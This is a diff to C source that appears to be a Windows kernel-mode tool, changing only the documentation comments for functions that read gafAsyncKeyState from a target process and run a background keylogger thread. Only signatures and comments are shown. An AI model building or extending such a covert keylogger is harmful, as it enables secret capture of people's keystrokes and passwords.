@@ -30,6 +30,13 @@ UINT8 KeyStateMap[64]         = { 0 };
 UINT8 KeyPreviousStateMap[64] = { 0 };
 UINT8 KeyRecentStateMap[64]   = { 0 };
 
+/*
+ * @brief Converts a virtual key code (VK) to its corresponding string representation.
+ *
+ * @param[in] vk Virtual key code.
+ *
+ * @return CONST CHAR* Corresponding character or key name.
+ */
 CONST CHAR*
 BeVkToChar(_In_ UINT8 vk)
 {
@@ -346,8 +353,11 @@ BeVkToChar(_In_ UINT8 vk)
     }
 }
 
-/**
- * Read the contents of GafAsyncKeyStateAddr into keyStateMap. 
+/*
+ * @brief Updates the key state map by reading the contents of GafAsyncKeyStateAddr.
+ *
+ * @param[in] ProcId Process ID of the target process.
+ * @param[in] GafAsyncKeyStateAddr Address of the key state structure.
  */
 VOID
 BeUpdateKeyStateMap(
@@ -379,11 +389,12 @@ BeUpdateKeyStateMap(
 	}
 }
 
-/**
- * @brief Check if the key was pressed since the last call to this function
- * 
- * @param[in] UINT8 virtual key code
- * @return BOOLEAN TRUE if the key was pressed, else FALSE
+/*
+ * @brief Checks if a key was pressed since the last function call.
+ *
+ * @param[in] Vk Virtual key code.
+ *
+ * @return BOOLEAN TRUE if the key was pressed, FALSE otherwise.
  */
 BOOLEAN
 BeWasKeyPressed(_In_ UINT8 Vk)
@@ -393,10 +404,10 @@ BeWasKeyPressed(_In_ UINT8 Vk)
 	return result;
 }
 
-/**
- * @brief Get the address of gafAsyncKeyState
- * 
- * @returns UINT64 address of gafAsyncKeyState
+/*
+ * @brief Retrieves the address of gafAsyncKeyState.
+ *
+ * @return PVOID Address of gafAsyncKeyState.
  */
 PVOID
 BeGetGafAsyncKeyStateAddress()
@@ -461,10 +472,10 @@ BeGetGafAsyncKeyStateAddress()
 	return Address;
 }
 
-/**
- * @brief Thread function that runs a keylogger in the background, directly reading from gafAsyncKeyStateAddress
- * 
- * @param[in] PVOID 
+/*
+ * @brief Background keylogger thread function that reads directly from gafAsyncKeyStateAddress.
+ *
+ * @param[in] StartContext Context parameter (unused).
  */
 VOID
 BeKeyLoggerFunction(_In_ PVOID StartContext)
